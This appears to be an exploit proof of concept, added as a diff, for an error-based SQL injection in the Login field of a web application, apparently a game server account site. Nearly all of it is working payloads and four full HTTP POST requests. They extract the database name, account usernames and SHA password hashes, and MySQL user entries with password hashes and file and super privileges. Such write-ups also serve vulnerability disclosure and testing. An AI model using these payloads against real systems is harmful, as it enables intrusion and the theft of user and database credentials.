@@ -1,0 +1,79 @@
+Proof of Concept (PoC):
+You need to first get the name of the current database using this syntax injected into the Login field:
+ 
+'and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+-
+ 
+Once we have that we can grab the authorized user details with this syntax injected into Login:
+ 
+'and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,id,0x3a,username,0x3a,sha_pass_hash,0x3a) FROM TableName.account+LIMIT+N,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-
+ 
+NOTE: Replace the TableName with the results from the first injection, and then use the N position to enumerate the results for all entries. 
+ 
+Extraction of MySQL User Credentials requires one to inject the following syntax into the Login field:
+ 
+'and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,host,0x3a,user,0x3a,password,0x3a,file_priv,0x3a,super_priv) FROM mysql.user+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-
+ 
+ 
+ 
+Examples:
+=============================================================================
+POST /?p=account&sub=login HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/?p=server&sub=chars
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; cookies=true; menuCookie=1%201%200%200%200%201%200%200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 244
+ 
+login='and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+-&pass=fubar&action=login&x=0&y=0
+=============================================================================
+POST /?p=account&sub=login HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http:// www.example.com /?p=server&sub=chars
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; cookies=true; menuCookie=1%201%200%200%200%201%200%200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 244
+ 
+login='and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,id,0x3a,username,0x3a,sha_pass_hash,0x3a) FROM tbc_realm.account+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-&pass=fubar&action=login&x=0&y=0
+=============================================================================
+POST /wow/?p=account&sub=login HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/wow/
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; menuCookie=1%201%200%200%200%201%200%200; cookies=true; base_language_id=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 262
+ 
+login='and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,host,0x3a,user,0x3a,password,0x3a,insert_priv,0x3a,file_priv,0x3a,super_priv) FROM mysql.user+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-&pass=fubar&action=login&x=0&y=0
+=============================================================================
+POST /?p=account&sub=login HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/?p=server&sub=chars
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; cookies=true; menuCookie=1%201%200%200%200%201%200%200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 273
+ 
+login='and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,host,0x3a,user,0x3a,password,0x3a,insert_priv,0x3a,file_priv,0x3a,super_priv) FROM mysql.user+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-&pass=fubar&action=login&x=0&y=0
+
